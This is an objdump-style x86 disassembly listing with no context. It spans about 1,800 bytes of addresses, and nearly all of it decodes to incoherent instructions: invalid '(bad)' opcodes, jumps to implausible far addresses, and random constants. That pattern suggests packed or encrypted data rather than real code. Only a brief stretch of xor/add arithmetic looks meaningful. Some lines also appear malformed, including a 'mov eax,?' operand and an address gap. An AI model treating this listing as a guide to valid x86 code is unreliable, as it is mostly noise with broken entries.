  40a6a6:	pusha  
  40a6a7:	jl     0x40a6d6
  40a6a9:	loopne 0x40a656
  40a6ab:	inc    eax
  40a6ac:	jnp    0x40a6fd
  40a6ae:	mov    dh,0xad
  40a6b0:	adc    BYTE PTR [ebx+0x39b168d8],dh
  40a6b6:	xchg   ecx,eax
  40a6b7:	inc    edi
  40a6b8:	inc    edx
  40a6b9:	stc    
  40a6ba:	pop    esp
  40a6bb:	jo     0x40a692
  40a6bd:	dec    ebp
  40a6be:	pop    ebx
  40a6bf:	rol    DWORD PTR [ebx+esi*8],cl
  40a6c2:	dec    ecx
  40a6c3:	or     al,0xaf
  40a6c5:	pusha  
  40a6c6:	aam    0x78
  40a6c8:	(bad)  
  40a6c9:	(bad)  
  40a6ca:	jl     0x40a6e7
  40a6cc:	add    eax,0x5b9d9b2c
  40a6d1:	jne    0x40a6a1
  40a6d3:	mov    ds:0x1c9ebc04,eax
  40a6d8:	out    dx,al
  40a6d9:	clc    
  40a6da:	mov    ebx,0xb433287b
  40a6df:	inc    edi
  40a6e0:	mov    edi,0xf155d998
  40a6e5:	das    
  40a6e6:	push   ebx
  40a6e7:	mov    eax,ds:0x9f01f547
  40a6ec:	ja     0x40a76d
  40a6ee:	jge    0x40a6be
  40a6f0:	adc    DWORD PTR [eax],eax
  40a6f2:	test   BYTE PTR [ecx+0x3],dl
  40a6f5:	inc    ebp
  40a6f6:	lods   al,BYTE PTR ds:[esi]
  40a6f7:	dec    eax
  40a6f8:	fisubr DWORD PTR [eax]
  40a6fa:	mov    dl,0x54
  40a6fc:	js     0x40a6ed
  40a6fe:	mov    al,ds:0xa3c92956
  40a703:	pusha  
  40a704:	mov    esi,DWORD PTR [ecx-0x3d720506]
  40a70a:	sub    BYTE PTR [edx-0xe06e124],al
  40a710:	jle    0x40a6d6
  40a712:	mov    ds:0x7c091ef0,eax
  40a717:	cmp    BYTE PTR [ebx+0x5eb42aa6],dl
  40a71d:	inc    esp
  40a71e:	shl    DWORD PTR [ecx],0x61
  40a721:	fwait
  40a722:	repz mov eax,esi
  40a725:	pusha  
  40a726:	aaa    
  40a727:	js     0x40a732
  40a729:	xchg   edx,eax
  40a72a:	int    0x2b
  40a72c:	cli    
  40a72d:	xchg   ecx,eax
  40a72e:	test   DWORD PTR [edx-0x5b5f4403],0x93d27a69
  40a738:	retf   
  40a739:	dec    ebx
  40a73a:	imul   eax,DWORD PTR [edx-0x273c67fe],0xffffffa6
  40a741:	or     DWORD PTR [eax-0x5e],0x3a48cef3
  40a748:	cld    
  40a749:	test   al,al
  40a74b:	(bad)  
  40a74c:	jmp    0x40a7b3
  40a74e:	pop    eax
  40a74f:	mov    esi,esi
  40a751:	cmp    eax,0x8e13e78b
  40a756:	pmulhw mm2,QWORD PTR [ecx-0x64]
  40a75a:	inc    ebx
  40a75b:	cmp    al,0xda
  40a75d:	cmp    cl,cl
  40a75f:	cmp    BYTE PTR [edi],al
  40a761:	jg     0x40a6ed
  40a763:	sbb    al,0xe8
  40a765:	mov    eax,ds:0x14e23901
  40a76a:	loope  0x40a7a2
  40a76c:	lods   eax,DWORD PTR ds:[esi]
  40a76d:	mov    ebx,0x925a1940
  40a772:	addr16 sbb eax,0xf0799853
  40a778:	cwde   
  40a779:	std    
  40a77a:	repnz stos DWORD PTR es:[edi],eax
  40a77c:	out    dx,eax
  40a77d:	or     cl,ch
  40a77f:	lods   al,BYTE PTR ds:[esi]
  40a780:	es js  0x40a70c
  40a783:	mov    edi,0x3a33c742
  40a788:	mov    ds:0xc45c9bd4,al
  40a78d:	rol    DWORD PTR [ebx+ebp*1-0x43],1
  40a791:	or     eax,0x92b1e8ab
  40a796:	pop    esi
  40a797:	xor    edx,DWORD PTR [ebp+esi*1+0x27]
  40a79b:	mov    bl,0x2f
  40a79d:	mov    edi,0xb01a048f
  40a7a2:	into   
  40a7a3:	mov    esi,0x7e4951f3
  40a7a8:	mov    ds:0x7a6b4014,eax
  40a7ad:	cmp    esi,0x8d1847f1
  40a7b3:	dec    edx
  40a7b4:	jmp    0x566b:0x529e2140
  40a7bb:	inc    edx
  40a7bc:	aam    0x1c
  40a7be:	jmp    0x40a75c
  40a7c0:	and    ah,BYTE PTR [esp+ebx*8+0x52]
  40a7c4:	mov    eax,?
  40a7c6:	mov    BYTE PTR [edi],bl
  40a7c8:	sahf   
  40a7c9:	or     BYTE PTR [esi+0x15a5fcb7],bh
  40a7cf:	sub    DWORD PTR [ebp-0x3cda86ae],0xc76deb42
  40a7d9:	test   BYTE PTR [esi+0x56d49efb],ah
  40a7df:	pop    ss
  40a7e0:	mov    BYTE PTR [esi+0x13],dl
  40a7e3:	push   edi
  40a7e4:	ja     0x40a77a
  40a7e6:	mov    edx,0xd4dcd34c
  40a7eb:	imul   eax,DWORD PTR [edi],0xffffffcf
  40a7ee:	mov    dl,0xe8
  40a7f0:	stos   BYTE PTR es:[edi],al
  40a7f1:	and    DWORD PTR ds:0x9b7abc16,esp
  40a7f7:	(bad)  
  40a7f8:	jp     0x40a79f
  40a7fa:	dec    ebx
  40a7fb:	sub    DWORD PTR [edx-0x24d1b4f0],0x286d3ca4
  40a805:	loope  0x40a851
  40a807:	pop    ecx
  40a808:	mov    DWORD PTR [edi-0x53],edi
  40a80b:	fisttp DWORD PTR [edi+0x39c0ed9a]
  40a811:	mov    al,ds:0x361787c1
  40a816:	fwait
  40a817:	outs   dx,BYTE PTR ds:[esi]
  40a818:	les    esp,FWORD PTR [ecx+0x98d7c79]
  40a81e:	dec    eax
  40a81f:	mov    edx,0xe93293c8
  40a824:	lea    edi,[eax-0x5c8e2003]
  40a82a:	jae    0x40a7d1
  40a82c:	mov    ds:0x683c3f1d,al
  40a831:	ins    DWORD PTR es:[edi],dx
  40a832:	pop    esi
  40a833:	hlt    
  40a834:	lods   al,BYTE PTR ds:[esi]
  40a835:	lea    eax,[eax-0x4a]
  40a838:	sbb    eax,0xd0123734
  40a83d:	rcr    BYTE PTR [edx],cl
  40a83f:	pushf  
  40a840:	js     0x40a89e
  40a842:	push   edx
  40a843:	out    dx,al
  40a844:	add    bh,ah
  40a846:	jbe    0x40a82f
  40a848:	sub    DWORD PTR [eax+edx*8+0x2f],edx
  40a84c:	cmp    esp,DWORD PTR [eax]
  40a84e:	mov    ebp,0xc50913aa
  40a853:	int    0xc9
  40a855:	(bad)  [edi-0xf2ec62e]
  40a85b:	xchg   ecx,eax
  40a85c:	js     0x40a7f5
  40a85e:	dec    edi
  40a85f:	adc    al,0x2c
  40a861:	or     BYTE PTR [edi],ah
  40a863:	cmp    BYTE PTR [edx-0x40],cl
  40a866:	or     BYTE PTR [edx],bh
  40a868:	clc    
  40a869:	sbb    edx,DWORD PTR [ecx+0xe7c2fc3]
  40a86f:	ret    
  40a870:	mov    esi,0x91db780
  40a875:	jecxz  0x40a8ce
  40a877:	mov    dh,0x64
  40a879:	sub    BYTE PTR [ebx+0x45174eab],dh
  40a87f:	inc    edi
  40a880:	add    esi,ebx
  40a882:	les    esp,FWORD PTR [edx]
  40a884:	mov    eax,0xb6483509
  40a889:	inc    eax
  40a88a:	sub    bh,BYTE PTR [ebp+0x583bfb7e]
  40a890:	retf   
  40a891:	scas   al,BYTE PTR es:[edi]
  40a892:	pusha  
  40a893:	aaa    
  40a894:	icebp  
  40a895:	shl    DWORD PTR [esi],1
  40a897:	jmp    0x40a8fe
  40a899:	fdivr  DWORD PTR [edi]
  40a89b:	aam    0x9a
  40a89d:	or     BYTE PTR ds:0xf97d7ce2,ch
  40a8a3:	ds pop esi
  40a8a5:	ja     0x40a919
  40a8a7:	mov    es,WORD PTR [ebp+ebx*1-0x1e]
  40a8ab:	int3   
  40a8ac:	addr16 add al,0xe1
  40a8af:	icebp  
  40a8b0:	adc    al,0x94
  40a8b2:	loop   0x40a8c4
  40a8b4:	mov    bl,0x94
  40a8b6:	xchg   ecx,eax
  40a8b7:	stos   BYTE PTR es:[edi],al
  40a8b8:	aam    0xed
  40a8ba:	push   cs
  40a8bb:	pop    esi
  40a8bc:	xor    BYTE PTR [ecx],ch
  40a8be:	add    esp,DWORD PTR [ecx-0x35]
  40a8c1:	push   esi
  40a8c2:	ror    ebp,0xe
  40a8c5:	test   bh,bl
  40a8c7:	retf   
  40a8c8:	xchg   edi,eax
  40a8c9:	cmp    al,0x72
  40a8cb:	sbb    eax,0xd41c912f
  40a8d0:	lods   eax,DWORD PTR ds:[esi]
  40a8d1:	fld    QWORD PTR [edx+0x13e38eac]
  40a8d7:	push   ebp
  40a8d8:	sub    edi,ebp
  40a8da:	imul   edx,DWORD PTR [esi],0x5c
  40a8dd:	inc    eax
  40a8de:	hlt    
  40a8df:	mov    edx,edx
  40a8e1:	test   al,0x7b
  40a8e3:	lock loop 0x40a8e6
  40a8e6:	fnsave [edi]
  40a8e8:	pusha  
  40a8e9:	ror    BYTE PTR [esi+0x4c],cl
  40a8ec:	pop    esi
  40a8ed:	aad    0xd5
  40a8ef:	repnz pop es
  40a8f1:	jmp    0xfd7d01a6
  40a8f6:	ins    DWORD PTR es:[edi],dx
  40a8f7:	lods   al,BYTE PTR ds:[esi]
  40a8f8:	xor    al,0xa3
  40a8fa:	push   0x129239d8
  40a8ff:	pusha  
  40a900:	stc    
  40a901:	and    BYTE PTR [ebx-0x2ff26e47],ch
  40a907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a908:	icebp  
  40a909:	(bad)  
  40a90a:	xor    al,0x35
  40a90c:	cmp    eax,0xb0a09d6d
  40a911:	jno    0x40a89c
  40a913:	mov    esi,0xe8ab6d16
  40a918:	mov    ebp,0x3884d1a2
  40a91d:	add    dl,bl
  40a91f:	shr    dl,cl
  40a921:	mov    esp,0xcd15f8bd
  40a926:	inc    edi
  40a927:	xor    DWORD PTR [ecx],edx
  40a929:	xchg   ebp,eax
  40a92a:	sub    bl,BYTE PTR [esi-0x16]
  40a92d:	sar    BYTE PTR [edi],0x4b
  40a930:	call   0x89fb:0x3f9a3b0e
  40a937:	inc    edx
  40a938:	xor    esp,DWORD PTR [eax]
  40a93a:	fsubr  QWORD PTR [edx-0x5e]
  40a93d:	fs out 0xa0,al
  40a940:	dec    esi
  40a941:	xchg   ebx,eax
  40a942:	xchg   esp,eax
  40a943:	fwait
  40a944:	adc    dl,BYTE PTR [eax+0x3d]
  40a947:	mov    ebx,0x76c97739
  40a94c:	fmul   DWORD PTR [esi+0x5e]
  40a94f:	mov    ch,BYTE PTR [ebx+0x52]
  40a952:	adc    al,0x73
  40a954:	pop    ss
  40a955:	jmp    0x5fe73019
  40a95a:	(bad)  
  40a95b:	(bad)  
  40a95c:	inc    ebp
  40a95d:	mov    DWORD PTR [ebx-0x84e1e54],eax
  40a963:	iret   
  40a964:	(bad)  
  40a965:	fimul  DWORD PTR ds:0xfb36a70f
  40a96b:	xor    dl,BYTE PTR [esi+edi*2+0x5c]
  40a96f:	sub    ecx,edx
  40a971:	ret    
  40a972:	addr16 xchg edx,eax
  40a974:	inc    esp
  40a975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a976:	retf   0x552e
  40a979:	adc    eax,0xb16c108e
  40a97e:	(bad)  
  40a97f:	cs mov ch,0xdc
  40a982:	retf   0x3b04
  40a985:	mov    eax,0xe0dfa70e
  40a98a:	test   DWORD PTR [edi],esp
  40a98c:	dec    ebp
  40a98d:	pop    ebx
  40a98e:	dec    ecx
  40a98f:	push   edx
  40a990:	xchg   esi,eax
  40a991:	je     0x40a947
  40a993:	sar    DWORD PTR [ecx],0x8
  40a996:	mov    ebp,0x75b15b52
  40a99b:	pop    ebp
  40a99c:	inc    edx
  40a99d:	add    BYTE PTR [edx+0x3b],dl
  40a9a0:	jae    0x40a968
  40a9a2:	ror    DWORD PTR [ecx-0x29],1
  40a9a5:	push   0x2d15e4b5
  40a9aa:	shrd   DWORD PTR [ebx+0x31],ebx,0x7f
  40a9af:	gs mov ebx,0x79cee24b
  40a9b5:	push   eax
  40a9b6:	or     al,0xbf
  40a9b8:	iret   
  40a9b9:	inc    ebp
  40a9ba:	call   0xb785e4db
  40a9bf:	inc    esp
  40a9c0:	les    esp,FWORD PTR [ebp-0x18]
  40a9c3:	in     eax,dx
  40a9c4:	mov    ds:0xd0167123,eax
  40a9c9:	xchg   BYTE PTR [eax+0x49],cl
  40a9cc:	xchg   ecx,eax
  40a9cd:	stos   DWORD PTR es:[edi],eax
  40a9ce:	jae    0x40a983
  40a9d0:	test   eax,0x206b2be4
  40a9d5:	push   0xffffffa5
  40a9d7:	and    al,0xad
  40a9d9:	std    
  40a9da:	into   
  40a9db:	cmp    cl,BYTE PTR [eax]
  40a9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9de:	cmp    ch,0x8e
  40a9e1:	inc    edi
  40a9e2:	and    edx,DWORD PTR [ebx-0x2b]
  40a9e5:	push   esp
  40a9e6:	ficomp WORD PTR [edx+0x42]
  40a9e9:	mov    ch,BYTE PTR [edx+0x61040fe7]
  40a9ef:	sbb    eax,0xc5204e8f
  40a9f4:	enter  0x619,0xc8
  40a9f8:	xchg   ch,dl
  40a9fa:	and    DWORD PTR [esi-0x6e7fefc],edx
  40aa00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa01:	call   0x56bc53bf
  40aa06:	and    bh,al
  40aa08:	mov    edi,0x28ec8bf6
  40aa0d:	nop
  40aa0e:	pop    ecx
  40aa0f:	cmp    esi,DWORD PTR [edx-0x4a828d7f]
  40aa15:	mov    edx,0x9a58d3fd
  40aa1a:	and    ecx,DWORD PTR [eax]
  40aa1c:	repz sti 
  40aa1e:	xor    DWORD PTR [edi-0x41b34a30],esp
  40aa24:	fdiv   st,st(4)
  40aa26:	dec    esp
  40aa27:	enter  0x6170,0xee
  40aa2b:	imul   esi,DWORD PTR [ecx-0x3b7e8451],0x41
  40aa32:	jnp    0x40aa6e
  40aa34:	mov    dh,0x5b
  40aa36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa37:	scas   al,BYTE PTR es:[edi]
  40aa38:	aam    0x96
  40aa3a:	pop    esp
  40aa3b:	bound  edx,QWORD PTR [esi+ebx*1]
  40aa3e:	ror    DWORD PTR [ebx-0x4f6bba5c],cl
  40aa44:	pop    ss
  40aa45:	or     edi,edi
  40aa47:	jecxz  0x40a9cb
  40aa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4a:	mov    bl,BYTE PTR [ebp-0x31c38979]
  40aa50:	sbb    bl,BYTE PTR [esi+eax*1+0xf]
  40aa54:	adc    ebp,DWORD PTR [edi-0x3]
  40aa57:	mov    ecx,0x7242d1c8
  40aa5c:	int3   
  40aa5d:	in     al,0xce
  40aa5f:	out    0x34,al
  40aa61:	nop
  40aa62:	and    dl,BYTE PTR [ebx]
  40aa64:	cmp    eax,0x18b71e6d
  40aa69:	fsubr  DWORD PTR [ebx+0x5e]
  40aa6c:	(bad)  
  40aa6d:	out    dx,al
  40aa6e:	push   ss
  40aa6f:	inc    esp
  40aa70:	dec    ecx
  40aa71:	push   0xffffffb6
  40aa73:	dec    edx
  40aa74:	cld    
  40aa75:	mov    ebx,0x6915be54
  40aa7a:	leave  
  40aa7b:	mov    edi,0x6e6a96af
  40aa80:	hlt    
  40aa81:	push   ecx
  40aa82:	mov    esp,0xba14ec2e
  40aa87:	int3   
  40aa88:	je     0x40aa0c
  40aa8a:	fnstenv [ebx-0x5b]
  40aa8d:	in     al,0x1f
  40aa8f:	inc    esp
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xe3d771bc
  40aacc:	mov    al,0x54
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx-0x75]
  40aad6:	test   BYTE PTR [ecx-0x56],cl
  40aad9:	and    eax,0x31b7d2aa
  40aade:	aas    
  40aadf:	ja     0x40ab28
  40aae1:	add    ah,BYTE PTR [eax-0x7a8ae5fe]
  40aae7:	(bad)  
  40aae8:	cdq    
  40aae9:	ss push ss
  40aaeb:	aad    0x70
  40aaed:	adc    DWORD PTR [eax+0x13ef0dcb],0xd341b3e2
  40aaf7:	mov    esi,0xef33c366
  40aafc:	dec    ebx
  40aafd:	cmp    bh,BYTE PTR [esi]
  40aaff:	addr16 fwait
  40ab01:	cdq    
  40ab02:	shr    DWORD PTR [ebx-0x5c792d07],cl
  40ab08:	sbb    al,0xa
  40ab0a:	dec    edx
  40ab0b:	jae    0x40ab03
  40ab0d:	inc    ebp
  40ab0e:	xchg   BYTE PTR ds:0x897de53c,cl
  40ab14:	push   edx
  40ab15:	lahf   
  40ab16:	fidivr DWORD PTR [edi]
  40ab18:	das    
  40ab19:	push   ds
  40ab1a:	(bad)  
  40ab1b:	mov    edi,0xfa6c0fa0
  40ab20:	(bad)  
  40ab21:	rcr    esi,cl
  40ab23:	(bad)  
  40ab24:	jmp    0xe7d6411
  40ab29:	and    ecx,eax
  40ab2b:	jns    0x40ab38
  40ab2d:	push   esp
  40ab2e:	enter  0xeb1f,0x14
  40ab32:	lds    ecx,FWORD PTR fs:[ecx-0x3bd2ba1b]
  40ab39:	mov    ah,0x88
  40ab3b:	xchg   esi,eax
  40ab3c:	mov    WORD PTR [eax-0x7],gs
  40ab3f:	pop    ss
  40ab40:	jne    0x40ab5b
  40ab42:	xchg   ebx,eax
  40ab43:	retf   0x157c
  40ab46:	xchg   ecx,eax
  40ab47:	mov    ebp,0x2f55a2cc
  40ab4c:	cmc    
  40ab4d:	hlt    
  40ab4e:	xlat   BYTE PTR ds:[ebx]
  40ab4f:	sbb    al,0x8b
  40ab51:	cmp    cl,BYTE PTR [eax+0x45]
  40ab54:	dec    edx
  40ab55:	outs   dx,BYTE PTR ds:[esi]
  40ab56:	xchg   BYTE PTR [edi+0x39],bh
  40ab59:	iret   
  40ab5a:	or     eax,0x83e2516c
  40ab5f:	pop    edi
  40ab60:	push   edi
  40ab61:	jbe    0x40abad
  40ab63:	dec    esi
  40ab64:	cmp    edi,DWORD PTR [esi-0x226020b1]
  40ab6a:	push   ecx
  40ab6b:	lds    edx,FWORD PTR [edx-0x74]
  40ab6e:	or     esp,edi
  40ab70:	inc    esp
  40ab71:	mov    bh,0xfe
  40ab73:	pop    ebp
  40ab74:	test   BYTE PTR [ebp+0x3],ah
  40ab77:	push   esi
  40ab78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab79:	cmc    
  40ab7a:	call   0x2c71bc2b
  40ab7f:	mov    BYTE PTR [eax-0xb],cl
  40ab82:	and    eax,DWORD PTR [ecx-0x4]
  40ab85:	out    0x6f,eax
  40ab87:	add    eax,esi
  40ab89:	mov    ds:0xa8e1a10c,eax
  40ab8e:	rol    BYTE PTR [ebx-0x59701cb8],1
  40ab94:	add    al,0xeb
  40ab96:	push   es
  40ab97:	dec    ebx
  40ab98:	sub    edi,edi
  40ab9a:	lods   al,BYTE PTR ds:[esi]
  40ab9b:	lahf   
  40ab9c:	push   es
  40ab9d:	cmp    ecx,DWORD PTR ds:0xd770b260
  40aba3:	fimul  DWORD PTR [eax]
  40aba5:	outs   dx,DWORD PTR ds:[esi]
  40aba6:	rol    DWORD PTR [eax],1
  40aba8:	js     0x40ab47
  40abaa:	test   DWORD PTR [ecx+0x7b],ebx
  40abad:	and    ebx,ebp
  40abaf:	stos   BYTE PTR es:[edi],al
  40abb0:	inc    ebp
  40abb1:	pop    esi
  40abb2:	(bad)  
  40abb3:	in     eax,dx
  40abb4:	iret   
  40abb5:	bound  edi,QWORD PTR [eax+0x930bb8e]
  40abbb:	cmp    BYTE PTR [ecx],al
  40abbd:	icebp  
  40abbe:	and    BYTE PTR [eax],dl
  40abc0:	sbb    dl,BYTE PTR [edx+0x61]
  40abc3:	mov    bh,0x64
  40abc5:	jnp    0x40ac2d
  40abc7:	mov    ah,0xc9
  40abc9:	dec    eax
  40abca:	jmp    0x40abb0
  40abcc:	shl    eax,0x11
  40abcf:	cmp    al,BYTE PTR [eax]
  40abd1:	push   ebx
  40abd2:	jne    0x40abda
  40abd4:	retf   0x38aa
  40abd7:	or     DWORD PTR [edx+eax*4-0x4d],ecx
  40abdb:	cdq    
  40abdc:	js     0x40abe4
  40abde:	lock aam 0x16
  40abe1:	int    0x78
  40abe3:	out    0xc9,eax
  40abe5:	stos   DWORD PTR es:[edi],eax
  40abe6:	adc    BYTE PTR [edi],bh
  40abe8:	mov    ecx,0x89803a84
  40abed:	jns    0x40ac30
  40abef:	add    dl,al
  40abf1:	rol    DWORD PTR [edi+0xa],cl
  40abf4:	rcr    BYTE PTR ss:[ecx+0x58],1
  40abf8:	adc    DWORD PTR [edx-0x7b],esi
  40abfb:	push   esi
  40abfc:	cmp    al,0xe9
  40abfe:	into   
  40abff:	daa    
  40ac00:	mov    bh,0x59
  40ac02:	icebp  
  40ac03:	ret    0x71a7
  40ac06:	jne    0x40abdf
  40ac08:	in     al,dx
  40ac09:	fs fcomi st,st(2)
  40ac0c:	(bad)  
  40ac0d:	mov    esi,0xeb9222f9
  40ac12:	rcr    BYTE PTR [edx],cl
  40ac14:	dec    esp
  40ac15:	ins    DWORD PTR es:[edi],dx
  40ac16:	out    0xf5,al
  40ac18:	das    
  40ac19:	cli    
  40ac1a:	cwde   
  40ac1b:	sbb    dh,dh
  40ac1d:	cmp    bh,ch
  40ac1f:	cwde   
  40ac20:	mov    edx,0xf68d156b
  40ac25:	popa   
  40ac26:	push   edi
  40ac27:	out    dx,eax
  40ac28:	pop    ss
  40ac29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac2a:	mov    eax,0xf78f4c4a
  40ac2f:	sub    cl,BYTE PTR ds:0x34f07aa0
  40ac35:	cmc    
  40ac36:	jmp    0xd7a6:0xf42ef6b3
  40ac3d:	fcom   st(7)
  40ac3f:	mov    al,BYTE PTR [edi+eax*2-0x3c656e94]
  40ac46:	mov    WORD PTR [ecx+0x52a3229f],fs
  40ac4c:	adc    BYTE PTR ds:0xe1e96dc,dh
  40ac52:	js     0x40ac3d
  40ac54:	adc    bl,BYTE PTR [ecx-0x5d]
  40ac57:	sub    bh,BYTE PTR [ebx+esi*4-0x1e]
  40ac5b:	pop    ebx
  40ac5c:	dec    esi
  40ac5d:	jns    0x40ac6b
  40ac5f:	aas    
  40ac60:	les    edi,FWORD PTR [ecx-0x3b]
  40ac63:	add    al,0xc2
  40ac65:	cmp    BYTE PTR [eax+0x68],cl
  40ac68:	inc    edi
  40ac69:	pushf  
  40ac6a:	cmp    al,0x4
  40ac6c:	test   dh,0xdc
  40ac6f:	pop    ebx
  40ac70:	push   edx
  40ac71:	lahf   
  40ac72:	push   eax
  40ac73:	lods   al,BYTE PTR ds:[esi]
  40ac74:	inc    eax
  40ac75:	sar    DWORD PTR [esi+esi*4-0x46d4219c],1
  40ac7c:	cmp    bh,BYTE PTR [edx-0x42]
  40ac7f:	sub    DWORD PTR [edx-0x1],eax
  40ac82:	loop   0x40ac5d
  40ac84:	xor    eax,esi
  40ac86:	lods   al,BYTE PTR ds:[esi]
  40ac87:	push   cs
  40ac88:	jp     0x40acfc
  40ac8a:	pop    es
  40ac8b:	nop
  40ac8c:	xor    eax,0x4b92a98c
  40ac91:	icebp  
  40ac92:	std    
  40ac93:	rcr    BYTE PTR [esi+0x5ef7fcf2],cl
  40ac99:	dec    eax
  40ac9b:	pusha  
  40ac9c:	cmp    DWORD PTR ds:0xe0d495cb,edx
  40aca2:	sahf   
  40aca3:	mov    ebp,edx
  40aca5:	ins    BYTE PTR es:[edi],dx
  40aca6:	push   es
  40aca7:	outs   dx,DWORD PTR ds:[esi]
  40aca8:	addr16 int3 
  40acaa:	xor    esi,DWORD PTR [eax-0x27]
  40acad:	loop   0x40ac7b
  40acaf:	mov    ebp,0xbb940490
  40acb4:	pop    edx
  40acb5:	jmp    0xb50062e8
  40acba:	das    
  40acbb:	test   DWORD PTR [ebp+eiz*4+0x32],0x12e6f471
  40acc3:	mul    dl
  40acc5:	sbb    esi,ebx
  40acc7:	jp     0x40ac63
  40acc9:	jae    0x40accb
  40accb:	es dec esi
  40accd:	mov    esi,0xc74bb4e9
  40acd2:	jmp    0x40ad29
  40acd4:	daa    
  40acd5:	mov    edi,0xaaf4d73e
  40acda:	xchg   ebx,eax
  40acdb:	cdq    
  40acdc:	out    0x7,eax
  40acde:	fild   WORD PTR ds:0x24e5e357
  40ace4:	ffreep st(5)
  40ace6:	nop
  40ace7:	xor    eax,0x5fce260b
  40acec:	fwait
  40aced:	xor    ecx,DWORD PTR [edx+0x6b36abb8]
  40acf3:	(bad)  
  40acf5:	fmul   QWORD PTR [ebp-0x30]
  40acf8:	outs   dx,BYTE PTR ds:[esi]
  40acf9:	inc    ecx
  40acfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfb:	out    dx,eax
  40acfc:	adc    bl,BYTE PTR [edi+ebp*4+0xc]
  40ad00:	aam    0xe7
  40ad02:	and    eax,0xffffffed
  40ad05:	jnp    0x40acbc
  40ad07:	inc    eax
  40ad08:	xor    al,0x70
  40ad0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad0b:	je     0x40ace5
  40ad0d:	xchg   edi,eax
  40ad0e:	sbb    BYTE PTR [ebx+0x63],dl
  40ad11:	jb     0x40aca9
  40ad13:	shl    DWORD PTR [ebp+0x4291b25c],0x26
  40ad1a:	loopne 0x40ad44
  40ad1c:	btr    DWORD PTR [ecx+edi*2+0x1196d925],edx
  40ad24:	mov    bl,0xd1
  40ad26:	jo     0x40ad67
  40ad28:	jge    0x40ad1a
  40ad2a:	dec    ecx
  40ad2b:	dec    esp
  40ad2c:	add    BYTE PTR [eax-0x2f],bh
  40ad2f:	xor    al,0x37
  40ad31:	mov    ebp,0x1d3fb13b
  40ad36:	push   ebp
  40ad37:	sub    esi,DWORD PTR [eax-0x891e297]
  40ad3d:	sub    DWORD PTR [ebx+0x2b45f17f],ebx
  40ad43:	retf   
  40ad44:	jg     0x40ad2d
  40ad46:	fwait
  40ad47:	aaa    
  40ad48:	xchg   esi,eax
  40ad49:	jns    0x40ad19
  40ad4b:	iret   
  40ad4c:	jp     0x40acfc
  40ad4e:	pop    ss
  40ad4f:	jo     0x40adb9
  40ad51:	adc    ah,ah
  40ad53:	clc    
  40ad54:	pop    eax
  40ad55:	mov    esi,cr2
  40ad58:	ds pushf 
  40ad5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad5b:	hlt    
  40ad5c:	inc    eax
  40ad5d:	cmp    DWORD PTR [eax+eax*2],esp
  40ad60:	mov    edi,0xb00479cd
  40ad65:	out    dx,eax
  40ad66:	bnd ret 0x3323
  40ad6a:	pop    ebx
  40ad6b:	aam    0x9c
  40ad6d:	cs push ds
  40ad6f:	out    0xca,al
  40ad71:	adc    al,BYTE PTR [ebp+eiz*4+0x2e]
  40ad75:	out    0xb1,al
  40ad77:	mov    esp,0x785643e
  40ad7c:	or     esi,0x8eef3639
  40ad82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad83:	pop    esi
  40ad84:	push   es
  40ad85:	jnp    0x40ad81
  40ad87:	xor    BYTE PTR [eax+ecx*4],al
  40ad8a:	ss ds test eax,0xff83b1d
  40ad91:	inc    eax
  40ad92:	xor    al,BYTE PTR [ebp+edx*1-0x6a143661]
  40ad99:	push   0x4552e73a
  40ad9e:	stos   DWORD PTR es:[edi],eax
  40ad9f:	(bad)  
  40ada0:	xor    DWORD PTR [eax-0x7b1993a8],edx
  40ada6:	mov    BYTE PTR es:[edi],dh
  40ada9:	inc    ebp
  40adaa:	and    DWORD PTR [edx-0x7d],0x74ec8287
  40adb1:	(bad)  
  40adb2:	push   edi
  40adb3:	cmp    ebx,DWORD PTR [ebx+0xac47b6]
  40adb9:	or     ecx,esp
  40adbb:	js     0x40addd
  40adbd:	xchg   edx,eax
  40adbe:	(bad)
  40adc1:	mov    esi,0x3c8aabeb
  40adc6:	nop
  40adc7:	inc    edi
  40adc8:	cmp    al,0x49
  40adca:	dec    eax
  40adcb:	mov    DWORD PTR [edi],ebx
  40adcd:	mov    esp,0x1ca3f0b0
  40add2:	xchg   esi,eax
  40add3:	aaa    
  40add4:	rcl    BYTE PTR ds:0xf3571889,1
  40adda:	int    0x69
  40addc:	jns    0x40ad66
  40adde:	inc    esp
  40addf:	pop    ebp
  40ade0:	loop   0x40ad70
  40ade2:	lahf   
  40ade3:	and    DWORD PTR [edi+0x2],ebx
  40ade6:	sbb    al,BYTE PTR [ebx+0x39bd3955]
  40adec:	or     al,0x45
  40adee:	or     BYTE PTR [edx+0x7b],bh
  40adf1:	mov    ds:0x5ed3e94c,eax
  40adf6:	mov    DWORD PTR [ebp+eax*8+0x4a],ebp
  40adfa:	adc    eax,0xa983d7e8
  40adff:	call   0x3add8ac6
